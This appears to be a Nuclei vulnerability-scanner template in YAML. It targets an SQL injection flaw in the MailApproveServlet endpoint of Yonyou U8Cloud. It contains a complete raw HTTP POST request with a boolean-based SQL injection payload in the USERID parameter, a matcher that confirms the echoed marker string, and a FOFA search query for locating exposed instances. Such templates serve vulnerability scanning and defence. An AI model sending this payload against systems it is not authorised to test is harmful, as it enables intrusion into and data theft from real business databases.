id: yonyou-u8cloud-mailapproveservlet-sqli

info:
  name: 用友U8Cloud MailApproveServlet SQL注入漏洞
  author: AiPoc
  severity: high
  description: |
    用友 U8Cloud nc.bs.pf.pub.MailApproveServlet 接口存在 SQL 注入漏洞，
    攻击者可通过 USERID 参数注入并回显特定字符串确认漏洞。
  metadata:
    fofa-query: 'title=="U8C"'
  tags: yonyou,u8cloud

http:
  - raw:
      - |
        POST /service/~uap/nc.bs.pf.pub.MailApproveServlet HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0
        Content-Type: application/x-www-form-urlencoded

        NEEDDISPATCH=&BILLID=1&BILLTYPE=BJ&USERID=admin' AND 1402=(char(113)||char(122)||char(122)||char(112)||char(113)||(CASE WHEN (1402=1402) THEN char(49) ELSE char(48) END)||char(113)||char(112)||char(112)||char(122)||char(113))-- ARhW&PASSWORD=admin&RESULT=APPROVED&DATASOURCE=U8cloud

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "qzzpq1qppzq"
